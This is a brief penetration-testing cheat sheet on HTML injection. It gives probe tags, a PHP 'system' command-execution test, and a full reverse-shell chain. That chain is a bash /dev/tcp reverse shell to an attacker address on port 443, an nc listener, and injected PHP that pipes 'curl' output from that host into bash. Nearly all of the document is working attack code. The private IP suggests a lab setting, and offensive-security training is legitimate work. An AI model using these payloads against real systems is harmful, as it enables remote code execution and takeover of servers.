# HTML Injection



## HTML Injection Enumeration

Test HTML tags in input fields:

```markup
<h1>Hola</h1>
<marquee>Hola</marquee>
```

Test malicious code in other languages \(e.g PHP\)

```php
<?php system("whoami"); ?>
```

## Reverse Shell via PHP Injection

Create an index.html file in your webroot directory that actually executes bash code:

```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.28/443 0>&1
```

Set a listener on a port of your choosing:

```text
nc -lvnp 443
```

Inject a malicious PHP code:

```php
<?php system("curl 10.10.14.28 | bash"); ?>
```

